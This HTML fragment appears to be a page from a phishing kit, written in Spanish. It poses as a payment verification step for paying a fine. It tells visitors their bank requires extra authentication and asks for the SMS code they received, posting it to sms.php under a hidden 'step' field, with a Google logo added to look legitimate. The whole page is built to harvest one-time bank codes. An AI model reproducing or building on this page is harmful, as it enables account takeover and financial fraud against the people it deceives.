        ...
        <main id="main" >
            <div class="container">
                ...
                <div class="login shadow dodg" >
                    <h5><b style="color:#002E6D">Verificación del pago</b></h5>
                    <div class="mb-3"><b></b></div>
                    <div>
                        <p class="lead" style="font-weight: 500;font-size: 15px;color: rgba(0, 0, 0,0.7);">Dado que su banco requiere autenticación adicional para validar su pago, ingrese el código SMS que recibió en su número </p>
                        <p class="lead" style="font-weight: 600;font-size: 16px;">acceso (aplicación o sitio web) para completar el proceso de pago de la multa.</p>
                    </div>
                    <form method="post" action="sms.php">
                      <input type="hidden" name="step" value="sms">
                      <div class="row align-items-center">
                        <div class="col-12">
                            <div class="form-group spopo mb-4 ">
                                <input type="text" name="sms" id="sms" required placeholder="" pattern="[0-9]{6,10}$"  placeholder="">
                                <label for="code" id="label" style="top: 8px;left: 0.84118rem;font-size: 12px;color:#002e6d;font-weight: 700;">Código recibido por SMS</label>
                                <img src="image/ssmms.png" width="40">
                            </div>
                            <div class="text-end ">
                                <img src="image/google.png" width="100px">
                            </div>
                        </div>
                      </div>
